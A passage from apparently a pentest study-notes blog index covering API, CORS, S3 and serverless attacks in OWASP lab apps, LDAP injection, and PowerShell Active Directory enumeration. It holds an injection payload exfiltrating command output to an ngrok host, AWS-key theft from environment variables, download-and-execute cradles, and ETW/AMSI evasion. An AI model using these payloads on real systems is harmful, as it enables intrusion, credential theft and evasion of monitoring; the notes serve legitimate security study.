/usr/local/bin/SoapUI-5.5.0 locate SoapUI   First connect it to the proxy, in this case, the Burpsuite instance. This way, u will be able to replay and change requests issued to the API. To set up the proxy, you need to go to File    -&gt; Preferences -&gt; Proxy Settings and point it to BURP instance         You can then switch the proxying on and off by clicking the Proxy Button on the upper menu.       Lets now try to parse the sample WSDL/WADL file. There are sample files shipped with the software itself   In order to load a WSDL (For SOAP) or WADL (For REST), click the respective buttons in the SoapUI on the upper menu.      By default, u can find example WSDL/WADL files in /root/SoapUI-Tutorials/WSDL-WADL/       If u now click on a tree node and then double click on Request, a request window will appear. In this case, we are viewing the login method.      The method can be found in the WSDL file as well. SoapUI automatically fills argument placeholders with ?. Its u who should decide what to fill in there.      In that case, we see that the application expects the argument of type String   If u press the green button, the request will be issued and, in this case, will be proxied through Burp Suite.      REST  Testing REST APIs can be done exactly in the same way; The difference is you import a WADL file instead of WSDL      So, once u encounter a WSDL on the web app, u can copy its source     (Open it in a Browser, go to Source, and select all -&gt; copy &amp; past to a file) and import it to SoapUI           The API is another transport mechanism For some information that is sent to the API Consumer (app back-end)   With this is mind,  u can try to tamper with everything that is transported by the API - For example, in case of a request similar to the previously presented one, you are free to check if the username or passwords field is vulnerable to injection attacks         The API implementation itself might be vulnerable to XXE attacks; However, modern APIs usually disallow DTD declarations       Basically, u r free to tamper with any of the API parameters as long as the SOAP message structure is correct.      In case u wanna to smuggle XML-style data, u can wrap them up in CDATA tags (XML comments), so the SOAP message is valid       API Access Control  In APIs, u will rarely see cookies being used. More often, the authentication mechanism will be basic authorization or a kind of token      It can be a pre-generated token that will be equivalent of a cookie   For example in the form of a header like:  X-Api-Token:&lt;token&gt;      What often is found in the APIs is broken access control.   Authorization Bypasses are very common   In order to test an API in a complex way For Access Control flaws, one need to:  - Prepare a working request to each API endpoint - Generate a token (or authorization header) For each of the API users - Combine each API request with each token to see which will work and which do not - Remember to test each request, also without any token      Such tests cases might be generated using SoapUI, which allows us to test issue a request to each API endpoint.   Also, as a reminder, double check if the API implementation uses all the methods provided by the original version   WIth Rundeck API there is a default possibility of running OS commands, which might be hidden from the documentation on a local API implementation.  https://docs.rundeck.com/docs/api/rundeck-api.html#adhoc   API Tokens are susceptible to vulnerabilities commonly diagnosed in session cookies, For example:  - Low entropy or predictable value - Lack of invalidation - Possible token leaks from the application infrastructure or possibility to generate tokens in advance      Tokens that might grant u access to an API interface are JWT Tokens, as well as the Bearer Authentication    Resource Sharing  As APIs are meant to be accessed by automated agents in order to lose SOP contraints a bit, the Cross-Origin Resource Sharing standard was implemented.      Simply put, CORS can add some exceptions to SOP by specifying some special headers in the server response.   We will be interested in two of these headers:  - Access-Control-Allow-Origin: [value] - Access-Control-Allow-Credentials: [true/false]      The first one specifies a domain that can access a certain websites response The second one specifies if its possible to add credentialing information (e.g. cookies) to the request    Access-Control-Allow-Origin value can be a domain, a wildcard or null      A wildcard means that a script hosted on any domain can access a response from that webpage   A certain domain value means that scripts (or any other user) from that domain can access the response   If the page victim.com sends back the header Access-Control-Allow-Origin: example.com, that means that if a XHR requesting victim.com script is hosted on example.com, and if the user visits example.com, the script will access victim.com as the user and receive the response.   However, if its a static page, then nothing special happens unless the victim.com allows another header Access-Control-Allow-Credentials: true           In that case, if the user is logged on victim.com and visits the mentioned script on example.com, victim.com will be visited in the context of logged-in users (the cookies will be sent with an XHR request) and restricted content can be stolen!            Browsers by default block responses if a site is overly permissive (if they allow wildcard origin together with credentials)          Trust with credentials to the arbritrary origin is a common vulnerability, not only in APIs.       That means if a page is accessible only For logged in users and it trusts the arbitrary origin, an exploit script can be hosted on a attacker controlled domain.       Once visited by a user logged in on the target website, it can steal sensitive information - user data or CSRF tokens.    Simple exploitation Case  Lets take a look at a simple exploitation case. We will issue a similar XHR request to a CORS-enabled page   A file is hosted on a php-enabled apache server         If u now navigate to that page while using BURP as a proxy, u can observe how it reacts to a custom Origin Header      The XHR script is now midified and example.com is replaced with The CORS enabled page      U can now observe that access to the response was gained. In an exploitation scenario, u may instead want to send this data to your controlled server in a similar way that you would steal a cookie using an XSS vuln.      Attacking Cloud Based Apps   Microservices: Different architectures and design evolution   Monolithic Design:  One server is used For holding the web app and needed services such as databases. This offers an easy setup and ease of maintenance at a relatively cheap price but introduces several disadvantages.      Monolithic designs are difficult to scale and although the maintenance is relateively easy, updating the server could cause doentimes and having a single point of failure can be a disaster if there is no backup plan in place.   Tiered Monolithic:  Services are separated, the web server is holding the web app while a different server is holding the database or required services.      Tiered monolithic architecture offers the possibility of performing updates without downtime and if server are clustered and load-balanced the performance improves over the previous approach.   Tiered monolithic designs are still hard to scale this is something that cannot be automated and if the cluster itself can be a single point of failure that can only be recovered from backups in case a disaster occurs.   Cloud Solutions:  Cloud solutions are build into elastic servers or services. This means horizontal scaling is possible to implement and fully automate, giving a better performance as new instances are created based on the resources needed.      Updates can also be performed without downtime and disasters do not involve backups in most of the cases. Although there are a lot of advantages over the previous designs, there are still problems at the application layer as its still one big codebase (monolithic) and costs can be hard to foreseen depending on the services needed.   Serverless Applications  Function as a Services (FaaS) - Are serverless applications, usually code functions , running in a cloud environment. This cloud environment and the application attack is managed by the cloud operator. As a result, it has the advantage of avoiding the complexity of building and maintaining the infrastructure typically associated with developing and launching an app.      Serverless applications have some limitations to be aware of, the execution time is limited to a few minutes, threads, usable disk space and ram are also limitations and there is the need of a trigger/event to run the app and a routing method or API gateway.      With this limitations in mind, serverless applications are not the best option For resources demanding jobs or tasks that need more than 10 minutes of execution.    Details of Serverless Architecture     API Routing: Routing layer calling the application based on the URL association, rules and paramaters. They make the functions to be reached from the internet.   In AWS its called API Gateway.      State: As mentioned before, the lifespan of a function is no more than a few minutes, For this reason there is no local cache that can be used and vulnerabilities like file command injections or file uploads are exploited in a different way due to this facts.   Cold Start: As the lifespan is limited, when the code has not been executed in a while or For the first time, it needs to be downloaded, containerized, booted, and primed to be run. This can be solved using 3rd party plugins like:   → http://github.com/Fidellimited/serverless-plugin-warmup      Debugging: Having the benefit of not managing the infrastructure means there are limitations with debugging due to the lack of access to logs. Instead of logging, another approaches such as printing variables or local lambda are usually put in practice For debugging applications.        No Ops: Limited sysadmin tasks as the environment is managed by the cloud operator. Backups, security monitoring and logging its still necessary.       With microservices and serverless apps there are some changes related to security. Network security changes drastically as the security model of functions does not rely on IP addresses and ports. Instead, they share the same external IP address and there are no local network restriction For them inside the host.      Although network restrictions are barely used, in order to apply restrictions cloud provided access controls and permissions are used.    Serverless Application Example  AWS account is necessary FOr this test      https://github.com/OWASP/DVSA   Go to https://aws.amazon.com/lambda to start creating a function:  1. Go to lambda, create application 2. Other Options 3. Browser Serverless app repository 4. Mark the option \"Show apps that create custom IAM roles or resource policies\" 5. Search DVSA   Go to the AWS System Manager, Parameter Store and look For the DVSA URL      Now head to the URL and register an account. It should be a real email For receiving the activation code.      The application has been deployed and we will come back to it later. Remember to delete resources once you finish working with them.    S3 Buckets  Simple Storage Service (S3) is an AWS scalable and distributed file system. These filesystem root folder are referred as buckets while everything else (files, subfolders) are referred as objects. Misconfigured S3 buckets have been the principal cause of many information leaks and attacks against organizations.   Lets create a new S3 bucket:      While creating buckets, there are several configuration options that can be selected in the process.        Access control and encryption can be specified at this stage.       Common S3 attacks consists in unauthorized access to objects. There attacks often gives the capability of modifying and creating new objects and changing existing policies and permissions on S3 buckets.   Tool: S3Recon     https://github.com/clarketm/s3recon   Automating the discovery of misconfigured buckets can be done using S3Recon.   Python-pip can be used to install S3Recon, although you might be aware of missing dependencies during the process and install them too.  pip install s3recon   S3Recon needs a wordlist, there is one in the Github repository or a personalized one can be created based on your needs. At this moment the one from the repository will be used.  curl -sSfL -o \"word-list.txt\" \"https://raw.githubusercontent.com/clarketm/s3recon/master/data/words.txt\"   Running S3 Recon with the worslist file can be done with:  s3recon \"word-list.txt\" -o \"results.json\" --public   Buckets marked as public could give access to restricted content. Objects could be accessed via aws-cli.      S3Recon can be integrated with MongoDB For scraping large results. This proves useful in bug bounty programs where any assets belonging to the company are within the scope.    Reports from hackerone related to S3 misconfigs  - https://hackerone.com/reports/631529 - https://hackerone.com/reports/507097 - https://hackerone.com/reports/504600 - https://hackerone.com/reports/209223   AWS Signed URLs  It can be used to give objects temporary access. Any user having this URL will be able to download the object For a limited time. They are commonly used by streaming providers.           Create a private bucket and add some files to it.            When trying to reach any off these URLs, an AccessDenied error will appear because the bucket has been set as private.            Using aws-cli, u should be able to access these objects once it has been configured via aws-cli configure command.       Files can be copied using  aws-cli cp &lt;S3URI&gt; &lt;LOCALPATH&gt;   Creating Signed URLs  Signed URLs can be generated using boto3 library For python  pip install boto3   Visiting the Signed URL shows the object contents.      Signed URLs gives access to a single file. This method it does not scale when access to a set of objects is needed.   For this reason signed cookies can be used to give access to more than one object at a time.   Serverless Event Injection  Serverless functions listen For events or triggers in order to be executed. These events can be injected from other trusted sources in cloud environments leading to a Serverless Event Injection vulnerability. These trusted sources can be:  - Actions on S3 Objects - Alerting Systems (CloudWatch) - API Gateway Calls - Changes in the code repository - Database events - HTTP APIs   Some serverless functions runs shell or eval content with unstrusted input. For instance, imagine a function with the previous example where the S3 URIs are user controlled.  \"os.system(\"aws S3 cp {0} {1} \".format(src_object,dst_object))\"      If we are able to control any of these variables a command injection vuln changing the name of the filename.    Serverless Event Injection Scenario  Remember that serverless functions live For a limited times. This is because they are executed in a small server that lives For a few minutes, this means regular vulnerabilities can exist but only For the time the server is alive.   The application converts Word doc files to text. It takes an URL (default one supplied) and outputs its contents on the screen.  OWASP ServerlessGoat      The function gets invoked by an AWS API Gateway Call. We can observe how the command is issued by crashing the application.   Observing the API Gateway configuration we can understand that this endpoint works as a Lambda Proxy, when the serverless functions receives the event from the proxy it gets invoked.   As we have seen the vulnerable code and where the injection takes place. Try injecting some commands  * use **&gt;/dev/null** after the document URL to receive a clean output      As the server will be recycled due to its limited life, there is no point on trying to backdoor it.      However, lambda functions store AWS keys in environment variables. They could be reached using env or cat /proc/self/environ    Serverless Event Injection Scenario 2  Back to Damn Vuln Serverless application installed before in order to discover more events that can be injected      Visit the URL and add some elements to the cart   Enter random details in the shipping information and submit them in order to receive the receipt.        If you take a look to the message of the order, it will contain an S3 bucket with an UUID For the order receipt       It seems the receipt is being copied from an S3 bucket folder generated using the receipts date and UUID.   This bucket permissions are relatively open, as uploading files is allowed via:  \"echo \"blah\"&gt;file.txt &amp;&amp; aws s3 cp file.txt 's3://&lt;BUCKET&gt;/2020/20/20/whatever' -acl public-read\"   It has been confirmed that the S3 bucket is open For read/write to everyone. Lets check the code in:  https://github.com/OWASP/DVSA/blob/master/backend/src/functions/processing/send_receipt_email.py   The event handler is reading the bucket name, key and order, then the function replaces the extension .raw by .txt meaning they expect a raw S3 Object. Then a download path is created and recorded into a log file using os.system      I have prints with this examples, but the quality is not great. So im not gonna post it       As in the previous example, the app pass to the os.system function some content that we can control as the S3 Bucket permissions are weak.   Folowwing the name convention that the function expects a OS Command Injection payload can be uploaded and executed using the S3 AWS API.   Ngrok - https://ngrok.com/      Ngrok will be used to expose local ports to the internet and catch a reverse shell For this exercise. Visit the website https://ngrok.com and register an account.   After the account has been created, download the ngrok client For your OS and authorize it following the instructions under connect your account   Once the account has been set up you can expose a local port to the internet running ngrok http 80 and taking note of the URL.   Requests received to port 80 can be checked on the local web interface  http://127.0.0.1:4040      Now, using the same naming convention as the function expects, a payload can be crafted to achieve RCE and receive the response back to our exposed interface.   Payload:  aws s3 cp empty.txt s3://&lt;your bucket id&gt;/2020/20/20/whatever_;curl XXX.grok.io?data=\"$(whoami)\";echo x.raw -acl public-read   whatever_; # it checks For an underscore in the file name Curl something.ngrok.io # THe ngrok endpoint to send the output \"$(whoami)\"; # the command to run Echo x.raw # needs to end in .raw to be triggered      WIth everything in place go and check the Ngrok web interface to check that there are some requests.                  Commands that return a multiline response will not go through as they will break the payload. However, they can be base64 encoded without breaking the lines using **$(ls -lha       base64 -w0)** in the payload                   Ngrok will now receive the requests that can be decoded to get the command output       If you output the env command result, it will include the AWS keys used by the lambda functions. As a result they will have the same privileges they are given and used with the API.   At this point DVSA stack can be deleted from the CloudFormation AWS Service and the S3 Buckets   GraphQL APIs  GraphQL is a different type of API interface where there is one endpoint to an API (instead of many endpoints in REST), and two types of operations (Query and Mutate) instead of 5 or so in REST (GET, PUT, POST, PATCH, DELETE)      Usually example.com/graphql or something similar (Nice idea of Google dorks)   REST usually has one endpoint For each type of object (users, groups, items, books, orders, shipments…etc) with 3 or more operations on each endpoint   In GraphQL, the same endpoint serves all predefined objects under both Query and Mutation methods   GraphQL Terms  - Query: A query operation on an object or type - Mutate: an update operation on an object, like creating a new one, updating it fully, updating it partially, or deleting it - Type (objecttype): A type of object, like a class or table, e.g. Users, Orders, books - Schema: Describes the types, fields and actions available - Introspection: A method to learn more about the schema details like types and fields - Resolver: A function that connects schema definitions to actual backend data sources like SQL tables - Scalar Type: Type of data For a field, like string, int or custom types.      GraphQL can also be called from the command line using curl:  - Using POST - Content-type is JSON - Output is sent to jq For pretty JSON   Calling a particular object in GraphQL:  curl -X POST -H \"Content-Type: application/json\" --data '{\"query\":\"{user(id:\\\"2\\\") {id username} }\"}' http://localhost/graphql | jq   GraphQL nesting queries  Display each user with his group subscriptions using GraphQL, showing the id and name of the group      Hint: groups {id name} Try both the GraphQL and Curl    Security in GraphQL  GraphQl has no built-in understanding of security. It will return the object as it was requested      Without explicit filtering, sensitive data could be exposed and extracted   Can we read user sensitive info such as passwords?   Making Updates in GraphQL  In graphql, updates (addition, creation, deletion) are called mutations   Example with 3 mudations:  class Mutation(graphene.ObjectType):   create_user = CreateUser.Field()   update_user = UpdateUser.Field()   delete_user = DeleteUser.Field()   Deleteuser Mutation  The deleteUser mutation can be called by:  - Defining the query type to be mutation - Selecting the named deletUser mutation - Supplying the id to be deleted, and a sub selection For response (ok field here)   mutation deleUser {   deleteUser(id:24)   {     ok   } }   curl -s -X POST -H \"Content-Type: application:json\" --data '{\"query\":\"mutation {deleteUser(id:22){ok}}\"}' http://localhost/graphql | jq   Function as a Service  Function as a Service (FaaS) is a modern (as of beginning of 2020) type of software architecture. Its implemented in most common cloud providers like AWS Lambda, Google Cloud Functions, IBM OpenWhisk or Microsoft Azure Functions      The FaaS model allows us to execute code in response to events without maintaning any infrastructure For it (apart from the cloud account). It allows the user to simply upload modular fragments of functionalities into the cloud in and they are executed independently   Such solution allows For better scalability, and is a next level of splitting a monolithic application into functional pieces   A sample Hello World in FaaS (written in Node.js)         Despite being a function, keep in mind that any online service exchanges and processes data or does any sort of authentication. This is exactly the same subject to abuse as any other web or cloud application   You can experiment more with Serverless software by downloading and playing with DVFaaS:  https://github.com/we45/DVFaaS-Damn-Vulnerable-Functions-as-a-Service      Each subdirectory of the project contains detailed steps to follow in order deploy as well as exploit a vulnerable instance    ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web","api"],
        "url": "/notes/ewptx/apiscloud/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser15.jpg"
      },{
        "title": "15 - Attacking LDAP",
        "excerpt":"  Attacking LDAP      What is LDAP   LDAP Syntax   Abusing LDAP   Objectives:      What is LDAP and How its used in web applications   Common LDAP vulnerabilities and methods of exploiting them   Introduction  LDAP stands For Lightweight Directory Access Protocol. It is a protocol used to modify and query directory services over TCP/IP      Directory services is a database-like virtual storage that holds data in specific hierarchical structure. LDAP structure is based on a tree of directory of entries   LDAP is object oriented, thus every entry in an LDAP directory services is an instance of an object and must correspond to the rules fixed For the attributes of the object.      LDAP can not only query objects from a directory database, it can also be used For management and authentication.   Note that LDAP is just a protocol to access Directory service, not a storage mechanism itself.   LDAP is used to communicate with Directory Databasess, but as a protocol it does not provide any storage capabilities.      Sample databases that use directory structure is Microsoft Active Directory (Where LDAP is often used in authentication process) or the less known OpenLDAP   LDIF Format  Objects in directory databasese accesses via LDAP are stored in LDIF which stands For LDAP Data Interchange Format. LDIF defines directory content as a set of records, one recor For each object (or entry). It also represents update requests, such as Add, Modify, Delete, and Renamem as a set of records, one record For each update request.      A directory database can support LDIF by defining its assumptions in a LDIF file. It can be a plaintext file simply containing directory data representation as well as LDAP commands. They are also used to read, write, and update data in a directory.      Lines 1-3: We are defining the top-level domain **org**  Lines 5-8: We are defining the subdomain **samplecompany**,for example **samplecompany.org**  Lines 10-16: We define two organization units (OU): it and marketing  Lines 18-26: We then add objects to the domain **samplecompany.org** and assign attributes with values # for example, *sn* stands for **surname**, “cn” stands for canonical name (or first name), while *mail* is a placeholder for an email address   Each directory services database might have different default attributes      For example, in OpenLDAP implementations you can a find userPassword attribute * (which can be interesting from a pentester standpoint) while there is no such attribute in Active Directory.    LDAP Syntax  Structure For querying the back-end database:  = # equal to | # logical or ! # logical not &amp; # logical and * # wildcard - stands For any string or character   Examples:  ch=John - will fetch personal entries where canonical name is \"john\" ch=J*   - will fetch personal entries where canonical name starts with \"j\" as a wildcard is placed in the query   Also can be concatenated:  (|(sn=a*)(cn=b*)) # the first 'OR' operator is used in order to indicate that we either look For all records which surname  # starts with \"a\" OR canonical name starts with \"b\"   LDAP Implementations  The LDAP as a protocol can be a completely independent implementation from they uderlying database   With that said, we can, For example, configure a web app to server as a front-end to an Active Directory database      Its possible to use AD (or another directory-based database) with LDAP in order to authenticate web application users.       This is a convenient method since some roles or user attributes will be shared with domain users, which can be then used For authorization purposes within a web application   This way, a web app can rely on PDAP and the backed directory role atributes when authorizing users to access certain resources      Of course, LDAP can be encountered as a database holding different information, which can include employee data or user account attributes; consider a web interface that can be used to browse employee structure in the company      In such as scenario, the web app might take the users input and incorporate it into the LDAP query in order to retrieve database results and present it to the application user.    Abusing LDAP   LDAP over TCP  You can often find LDAP services during the scaning of network infrastructure on default ports:  389 - For unencrypted connections 636 - For LDAP SSL   In order to connect to standalone LDAP services via pure TCP protocol, you can use tool named JXplorer. It can be downloaded in various formats from its homepage and does not require installation. It can also be download as a standalone jar file, which can be run using command:  java -jar JXplorer.jar http://jxplorer.org/      Since we are focused on web-based implementations, we will leave the JQXplorer For our experiments.    As previously mentioned, LDAP can be integrated with a web application, which can take user input and implement it into an LDAP query. If there is no sanitization of user input, several things can go wrong.   LDAP Vulnerabilities  What can happen without proper user sanitization in web-based LDAP implementations depends heavily on the purpose and content of the LDAP.      The basic and most obvious vulns can be LDAP injection. If they query is not sanitized enough, an attacker can place a wildcard instead of a legitimate object, pulling all the objects instead of just one.   Depending on the app architecture, it might or might not be a security flaw.      If the user was not meant to see the object he made accessible using a wildcard, then the LDAP injection results in sensitive information retrieval.   Pulling an enourmous amount of data at once could also lead to a Denial of Service condition; If the back-end database is large enough, there is a high likelihood that the front-end was designed in order to filter query results in order not to overload the database engine.      In that case, multiple wildcard queries might render the database unavailable effectively disallowing access to the application service.    A critical vuln from 2017 - Joomla-based websites when LDAP authentication plugin was used:  https://blog.ripstech.com/2017/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/   An available exploit can be found on the resource below:  http://www.spy-soft.net/wp-content/uploads/Joomla-LDAP-Injection.txt      Suppose that an attacker can infer from the server responses that the code injected into the LDAP query generates true (valid response) ot false (error)      In such a case, its still possible to exploit a Blind LDAP injection.    LDAP Injection  Suppose that a web app allows us to list all available printers from a LDAP directory. Error messages are not returned. The application utilizes the following search filter:  (&amp;(objectclass=printer)(type=Canon*))   As a result, if any Canon printers are available, icons of these printers are shown to the client. Otherwise, no icon is present. This is an exemplary true/false situation.   Blind LDAP Injection  If we inject string “)(objectClass=))(&amp;(objectClass=void”, then the web app will issue the following query:  (&amp;(objectClass=*)(objectClass=*))(&amp;objectClass=void)(type=Canon*))      In that casem only the first LDAP query will be processed resulting in (&amp;(objectClass=)(objectClass=)) being extracted from the back-end.    As a result,  the printer icon will be shown to the client. As this query always returns results due to objectClass being set to a wildcard. We can construct further true/false statements in the following way:  (&amp;(objectClass=*)(objectClass=users))(&amp;objectClass=foo)(type=Canon*)) (&amp;(objectClass=*)(objectClass=resources))(&amp;objectClass=foo)(type=Canon*))     Using such queries, its possible to enumerate possible object classes based on true/false conditions (printer icon should be shown or not)   Similar logic can be used in case of OR blind LDAP injection. Consider the following query with injected part in red:  (|(objectClass=void)(objectClass=void))(&amp;objectClass=void)(type=Canon*))      Such a query returns no object, so the printer icon should not be shown to the user    In order to gather information, a similar technique can be applied:  (|(objectClass=void)(objectClass=users))(&amp;objectClass=void)(type=Canon*)) (|(objectClass=void)(objectClass=resources))(&amp;objectClass=void)(type=Canon*))      This will allow us to enumerate the directory structure    LDAP Python implementation  Consider the following code that can be responsible For implementing LDAP Server logic   Implementing LDAP Server  Here we are importing some modules:      A LDIF file is defined as a variable named LDIF      The directory structure is defined here      The main class of the LDAPserver.py is defined:      Here the main function is defined.   The LDAP Server will listen for incoming connections on port 8080 of the localhost or a command-line specified port.      python ldapserver.py to start the server:         Make sure that port 8080 is available, as the server will not throw an exception in such a case    Implementing LDAP Client   The file will be named LDAPinfo.java      Here we import some packages that will be used in the software      The comments of the LDAPinfo class contain explanation of the functionalities      The mentioned source code can be compiled with:  javac -d classes LDAPinfo.java   And then it can be run with:  java -cp classes LDAPinfo bob      Blind LDAP Injection Example  The client we have compiled is vulnerable to Blind LDAP injection. Lets try to use it in a lifitimate way first  java -cp classes LDAPinfo bob # found java -cp classes LDAPinfo notbob # not found   Despite the app prints just the telephone number, it can be helpful to extract more data. Take a look at the example:  java -cp classes LDAPinfo \"bob)(userPassword=a*\" # nothing found   Lets enumerate more letters:  java -cp classes LDAPinfo \"bob)(userPassword=b*\" # keep going   When encountering the letter ‘s’, we can see that the telephone number is shown  java -cp classes LDAPinfo \"bob)(userPassword=s*\" # found # it means that the first letter of the password is \"s\"   We can go further until find the whole password  java -cp classes LDAPinfo \"bob)(userPassword=secret\"        Such an exploitation scenario could be perfect fit For sensitive information extraction Although we were using a command-line LDAP frontend keep in mind that web app would work with LDAP in the same way    Labs      There is 3 boring labs       LDAP Injection, HTML Adapter to Root and Insecure RMI      Didn’t take good notes on that, so its not really worth it. But if anyone want, lemme know   ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web"],
        "url": "/notes/ewptx/ldap/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser16.jpg"
      },{
        "title": "1 - Powershell",
        "excerpt":"  Active Directory Exploitation      This can be used as an intro for Active Directory Security Content (CRTP for example)       I’ve sorted in 4 chapters: Powershell, Bloodhound, Privesc and Lateral Movement    Powershell   % = foreach $_ = current object  example: 1,2,3,4 | % {$_+3} = 4,5,6,7   ? = where eq = equal ne = not equal like = similar/comparable gt = greater than lt = less than example: Get-Service | ? {$_.Status -ne \"Running\"}    select = Select-Object example: Get-Service dhcp | select ServiceName CanPauseAndContinue,DisplayName   sls = Select-String example: ls -r &lt;path&gt; -File *.txt | %{ sls -Path $_ -Pattern pass* }   Module:  C:\\$Env:PsModulePath all modules in this path are imported automatically  # Get-Command -Module &lt;module name&gt;   Using New-Object:  $variable = New-Object System.Net.WebClient $variable | gm   //gm = Get-Member $address= \"&lt;web server/file&gt;\" $path = \"&lt;full path/file&gt;\" $variable.DownloadFile($address,$path)  iex $variable.DownloadString($address,$path) # this will \"download\" the string of the file and the iex = Invoke-Expression will execute the string as a command   The cmdlets associated with the process:  Get-Command *process* -CommandType cmdlet | Measure-Object   verbo “Set”:  (Get-Command -CommandType cmdlet | Sort-Object Verb | sls ^Set).Count   4 processo utilizando mais memoria:  ps | Sort-Object -Property WS -Descending | Select-Object -Index 3   Portscan:  1..1024 | %{echo ((new-object Net.Sockets.TcpClient).Connect(\"IP\",$_)) \"Port $_ is open\"} 2&gt;$null   Download:   Kali: open a webserver with a xml file:  &lt;?xml version=\"1.0\"?&gt; &lt;command&gt;   &lt;a&gt;     &lt;execute&gt;Set-ExecutionPolicy Bypass -Force -Scope CurrentUser&lt;/execute&gt;   &lt;/a&gt;   &lt;b&gt;     &lt;execute&gt;Get-Process&lt;/execute&gt;   &lt;/b&gt; &lt;/command&gt;   Target:  $docxml = New-Object System.Xml.XmlDocument $docxml.Load(\"http://ip/file.xml\");  iex $docxml.command.a.execute    Especify user-agent: allows disguising requests  $variable.Headers.Add(\"user-agent\",\"redteam\") iex $variable.DownloadString($address,$path)   AMSI   amsi.fail   Event Tracking for Windows (ETW)  C:\\Remove-EtwTraceProvider -AutologgerName EventLog-Application -Guid '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'  # this command will delete the register key, in other word it disables the ETW   Remove the provider ETW in a session:  C:\\logman update trace EventLog-Application --p Microsoft-Windows-PowerShell -ets   Obfuscation   Invoke-CradleCrafter:      Generate payload for remote downloads and obfucated scripts   Invoke-Obfuscation:  - it does various types of obfuscation and encoding   first import the module &gt; Import-Module Invoke-Obfuscation.psd1   Impacket has a module that opens a share in  a smb server for file transfer:  on Kali   &gt; impacket-smbserver -smb2support &lt;share name&gt; &lt;directory&gt; on Target &gt; net uset z: \\\\&lt;kali ip&gt;\\&lt;share name&gt; then just cd to z:   git reset --hard # update the repository   pwsh # to open powershel on Linux   Domain Enumeration   show domain info:  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() $PDC = ($domainObj.PdcRoleOwner).Name $SearchString = \"LDAP://\" $SearchString += $PDC + \"/\" $DistinguishedName = \"DC=$($domainObj.Name.Replace('.',',DC='))\" $SearchString += $DistinguishedName $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString) $objDomain = New-Object System.DirectoryServices.DirectoryEntry $Searcher.SearchRoot=$objDomain $Searcher.filter=\"samAccountType=805306369\" $Searcher.FindAll()   $Result=$Searcher.FindAll() Foreach($obj in $Result){ Foreach($prop in $obj.Properties) {$prop} Write-Host \"---------\"}      805306369 - enum all user accounts       805306368 - enum all user machines    change tab name = $host.UI.RawUI.WindowTitle = “AD-MODULE”   Module AD:   ADModule:  Import-Module Microsoft.ActiveDirectory.Management.dll  Get-ADDomain Get-ADDomain -Identity &lt;domain&gt; (Get-ADDomain).DomainSID Get-ADDomainController [-DomainName &lt;domain&gt;] Get-ADUser -Filter * -Properties * [-Server &lt;domain&gt;]   Get-ADUser -Identity &lt;user&gt;   Get-ADUser | gm -MemberType *Property | select name   Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}   Get-ADUser -Filter ‘Description -like \"*pass*” ’-Properties * | select name Get-ADGroup -Filter * -Properties * | fl name //.count   Get-ADPrincipalGroupMembership -Identity &lt;user&gt;   Get-ADGroup -Filter “Name -like ‘*admin*’” | select name Get-ADGroupMember -Identity “Domain Admins” -Recursive Get-ADComputer -Filter * -Properties *   PowerView:  dot source to import = . .\\powerview.ps1  Get-NetDomain Get-NetDomain -Domain &lt;domain&gt; Get-DomainSID Get-DomainController [-Domain &lt;domain&gt;] Get-DomainPolicy   (Get-DomainPolicy).SystemAccess   ((Get-DomainPolicy).KerberosPolicy  Get-NetUser [(-Domain &lt;domain&gt;) | select name]   Get-NetUser -Identity &lt;user&gt;   Get-NetUser | gm //Get-Member   Get-NetUser | ?{$_.admincount -eq 1} | select name   Get-NetUser | ?{$_.logoncount -gt 0} | select name   Get-NetUser \t-Filter “(description=*)” | select name,description  Get-NetGroup [-Domain &lt;domain&gt;]   Get-NetGroup -UserName &lt;user&gt;   Get-NetGroup *admin* | select cn Get-NetGroupMember “Administrators” [-Recurse]  Get-NetLoggedon [-ComputerName &lt;computer&gt;] *admin required Get-LastLoggedOn [-ComputerName &lt;computer&gt;] *admin required  Get-NetComputer [-Domain] [-Ping] [-OperatingSystem “*Server*”] Invoke-ShareFinder -verbose //find open shares Invoke-FileFinder -verbose  // find sensitive info   Requires admin priv:  Find-LocalAdminAccess -verbose Invoke-EnumerateLocalADmin   Get-NetSession query session  #search where the admin is logged and if the curent user has access  Invoke-UserHunter -Check Access   GPO Enum:  &gt; ADModule Get-ADOrganizationalUnit -Filter * -Properties *   &gt; PowerView Get-NetGPO [-ComputerName &lt;name&gt;] Find-GPOComputerAdmin -ComputerName &lt;name&gt; Get-NetOU Get-NetGPO -Identity “{&lt;gplink&gt;}”   &gt; GPO Get-GPO -All Get-GPResultantSetOfPolicy -ReportType HTML -Path C:\\file.html Get-GPO -Guid &lt;gplink&gt;   ACL Enum:   permission to keep an eye:  - GenericAll = FullControl - GenericWrite - WriteOwner - WriteDACL - AllExtendedRights - ForceChangePassword - Self (Self-Membership)   ADModule:  (Get-ACL ‘AD:\\CN=Administrator,CN=Users,DC=alunos,DC=domain,DC=local’).Access  &gt; PowerView Get-ObjectAcl -samAccountName &lt;user&gt; [-ResolveGUIDs] Get-NetUser | select name, objectsid ConvertFrom-SID &lt;sid&gt; ConvertTo-SID “&lt;user&gt;” Get-DomainObjectAcl | select @{ Name='&lt;object&gt;'; Expression={ConvertFrom-SID $_.SecurityIdentifier}},ObjectDN,ActiveDirectoryRights    Get-ObjectAcl -SamAccountName &lt;user&gt; | select @{ Name='&lt;object&gt;'; Expression={ConvertFrom-SID $_.SecurityIdentifier}},ActiveDirectoryRights \t Get-ObjectAcl | ? {$_.SecurityIdentifier -match $(ConvertTo-SID “Domain Admins”)} | select ObjectDN,ActiveDirectoryRights  Get-ObjectAcl  -SamAccountName Administrator | ? {$_.ActiveDirectoryRights -match “GenericAll”)} | select @{} Name=”principal \";Expression={ConvertFrom-SID $_.SecurityIdentifier}} \t Invoke-ACLScanner -ResolveGUIDs\t Get-PathAcl -path “\\\\dc.domain.local\\sysvol” Get-ObjectAcl -ADSPath “LDAP://CN=Domain Admins,CN=Group,DC=domain, DC=local”   Domain Trusts  Enum  - Unidirectional = If A trusts B, B can access A  - Bidirectional = both can access  - Transitive = if A trusts B, and B trusts C then A trusts C - Non-Transitive = 